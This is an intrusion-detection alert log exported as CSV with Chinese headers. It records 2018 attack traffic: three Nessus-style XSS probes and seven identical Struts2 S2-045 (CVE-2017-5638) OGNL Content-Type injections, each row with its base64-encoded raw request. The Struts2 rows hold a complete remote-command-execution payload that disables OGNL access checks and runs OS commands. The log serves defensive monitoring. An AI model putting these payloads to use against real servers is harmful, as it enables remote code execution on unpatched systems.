类型,处理状态,危险程度,时间,事件名称,事件次数,源IP,目的IP,协议摘要,上报设备,区域,规则编号,流行程度,攻击手段,服务类型,网络接口,动作,源MAC地址,源端口,目的MAC地址,目的端口,原始报文长度,原始报文内容
灰名单,已处理,中风险,2018-11-06 23:56:27,Web服务远程跨站脚本执行攻击,1,61.171.45.14,10.3.34.82,TCP.HTTP C URL=/console/faces/com_sun_web_ui/help/helpwindow.jsp PARAM=windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HOST=ccb.com,11.170.236.111(新一代汇聚层),北京新一代,29002,低,获取权限攻击,CGI,T1/1,中风险,0C:DA:41:6B:D7:00,35624,00:50:56:87:A1:5F,80,756,R0VUIC9jb25zb2xlL2ZhY2VzL2NvbV9zdW5fd2ViX3VpL2hlbHAvaGVscHdpbmRvdy5qc3A/d2luZG93VGl0bGU9JTNjL3RpdGxlJTNlJTNjc2NyaXB0JTNlYWxlcnQoJTI3c3VuX2phdmFfd2ViX2NvbnNvbGVfaGVscHdpbmRvd194c3MubmFzbCUyNyklM2Mvc2NyaXB0JTNlIEhUVFAvMS4xDQpIb3N0OiBjY2IuY29tDQpBY2NlcHQtQ2hhcnNldDogaXNvLTg4NTktMSx1dGYtODtxPTAuOSwqO3E9MC4xDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQpDb29raWU6IElORk89OWE5dXxXK0c1cjsgQklHaXBTZXJ2ZXJjY3ZjY19qdF8xOTcuMV84MF93ZWJfcG9vbD0xMzc3OTYwNzE0LjIwNDgwLjAwMDANClVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDguMDsgV2luZG93cyBOVCA1LjE7IFRyaWRlbnQvNC4wKQ0KUHJhZ21hOiBuby1jYWNoZQ0KQWNjZXB0OiBpbWFnZS9naWYsIGltYWdlL3gteGJpdG1hcCwgaW1hZ2UvanBlZywgaW1hZ2UvcGpwZWcsIGltYWdlL3BuZywgKi8qDQpYLUZvcndhcmRlZC1Gb3I6IDYxLjE3MS40NS4xNA0KDQo=
灰名单,已处理,中风险,2018-11-06 23:56:27,Web服务远程跨站脚本执行攻击,1,61.171.45.14,10.3.35.81,TCP.HTTP C URL=/login PARAM=user=**<script>JavaScript:alert('cpanel_login_user_xss.nasl');</script> HOST=ccb.com,11.155.22.97(新一代汇聚层5),北京新一代,29002,低,获取权限攻击,CGI,T1/2,中风险,0C:DA:41:6B:D7:00,58793,00:50:56:87:FF:04,80,560,R0VUIC9sb2dpbj91c2VyPSoqJTNDc2NyaXB0JTNFSmF2YVNjcmlwdDphbGVydCgnY3BhbmVsX2xvZ2luX3VzZXJfeHNzLm5hc2wnKSUzQiUzQyUyRnNjcmlwdCUzRSBIVFRQLzEuMQ0KSG9zdDogY2NiLmNvbQ0KQWNjZXB0LUNoYXJzZXQ6IGlzby04ODU5LTEsdXRmLTg7cT0wLjksKjtxPTAuMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KQ29ubmVjdGlvbjogS2VlcC1BbGl2ZQ0KVXNlci1BZ2VudDogTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDUuMTsgVHJpZGVudC80LjApDQpQcmFnbWE6IG5vLWNhY2hlDQpBY2NlcHQ6IGltYWdlL2dpZiwgaW1hZ2UveC14Yml0bWFwLCBpbWFnZS9qcGVnLCBpbWFnZS9wanBlZywgaW1hZ2UvcG5nLCAqLyoNClgtRm9yd2FyZGVkLUZvcjogNjEuMTcxLjQ1LjE0DQoNCg==
灰名单,已处理,中风险,2018-11-06 23:54:21,Web服务远程跨站脚本执行攻击,1,61.171.45.14,10.3.35.71,"TCP.HTTP C URL=/WebID/IISWebAgentIF.dll PARAM=postdata=""><script>foo</script> HOST=ccb.com",11.155.22.97(新一代汇聚层5),北京新一代,29002,低,获取权限攻击,CGI,T1/1,中风险,0C:DA:41:6B:D7:00,19346,00:50:56:87:47:58,80,496,R0VUIC9XZWJJRC9JSVNXZWJBZ2VudElGLmRsbD9wb3N0ZGF0YT0iPjxzY3JpcHQ+Zm9vPC9zY3JpcHQ+IEhUVFAvMS4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQpIb3N0OiBjY2IuY29tDQpQcmFnbWE6IG5vLWNhY2hlDQpVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA4LjA7IFdpbmRvd3MgTlQgNS4xOyBUcmlkZW50LzQuMCkNCkFjY2VwdDogaW1hZ2UvZ2lmLCBpbWFnZS94LXhiaXRtYXAsIGltYWdlL2pwZWcsIGltYWdlL3BqcGVnLCBpbWFnZS9wbmcsICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KQWNjZXB0LUNoYXJzZXQ6IGlzby04ODU5LTEsKix1dGYtOA0KWC1Gb3J3YXJkZWQtRm9yOiA2MS4xNzEuNDUuMTQNCg0K
灰名单,已处理,高风险,2018-11-06 23:43:51,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.128,"TCP.HTTP C URL=/index.action HOST=58.49.73.215 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/1,高风险,B4:14:89:E0:41:41,3890,68:BD:AB:D6:1D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
灰名单,已处理,高风险,2018-11-06 23:43:49,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.128,"TCP.HTTP C URL=/index.action HOST=58.49.72.215 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/1,高风险,B4:14:89:E0:41:41,2424,68:BD:AB:D6:1D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
灰名单,已处理,高风险,2018-11-06 23:42:56,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.66,"TCP.HTTP C URL=/index.action HOST=58.49.73.179 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/1,高风险,B4:14:89:E0:41:41,3375,68:BD:AB:D6:1D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
灰名单,已处理,高风险,2018-11-06 23:42:56,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.65,"TCP.HTTP C URL=/index.action HOST=58.49.73.177 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/2,高风险,B4:14:89:E0:41:41,3611,F8:66:F2:0F:8D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
灰名单,已处理,高风险,2018-11-06 23:42:52,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.69,"TCP.HTTP C URL=/index.action HOST=58.49.73.180 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/1,高风险,B4:14:89:E0:41:41,2589,68:BD:AB:D6:1D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
灰名单,已处理,高风险,2018-11-06 23:42:52,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.66,"TCP.HTTP C URL=/index.action HOST=58.49.72.179 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/2,高风险,B4:14:89:E0:41:41,4885,F8:66:F2:0F:8D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
灰名单,已处理,高风险,2018-11-06 23:42:51,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,58.218.66.210,10.5.200.134,"TCP.HTTP C URL=/index.action HOST=58.49.73.236 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=0",11.50.228.136(7号楼互联网),武汉南湖,23986,低,获取权限攻击,www,T1/1,高风险,B4:14:89:E0:41:41,1058,68:BD:AB:D6:1D:C1,80,684,R0VUIC9pbmRleC5hY3Rpb24gSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzEyXzMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81Ni4wLjI5MjQuODcgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogJXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFU=
